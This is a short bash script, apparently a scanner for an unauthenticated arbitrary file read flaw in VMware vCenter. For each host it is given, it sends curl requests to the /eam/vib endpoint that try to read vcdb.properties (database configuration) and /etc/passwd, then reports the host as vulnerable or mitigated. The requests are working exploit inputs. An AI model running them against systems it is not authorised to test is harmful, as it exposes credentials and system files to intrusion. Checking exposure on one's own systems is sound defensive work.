#!/bin/bash
#
# Arbitrary File Read vulnerability in VMware vCenter(Unauthenticated)
#
# Usage :
# $ echo "host1 host2 host3" | ./scanner
# $ cat myservers | ./scanner
#
servers="$(cat)"

for servers in $servers; do
	# command test here
curl -vk --path-as-is "https://$servers/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties" 2>&1 | grep "driver" >/dev/null && echo "VULNERABLE: $servers" || echo "MITIGATED: $servers"    
curl -vk --path-as-is "https://$servers/eam/vib?id=/etc/passwd" 2>&1 | grep "root:[x*]:0:0" >/dev/null && echo "VULNERABLE: $servers" || echo "MITIGATED: $servers"    

done
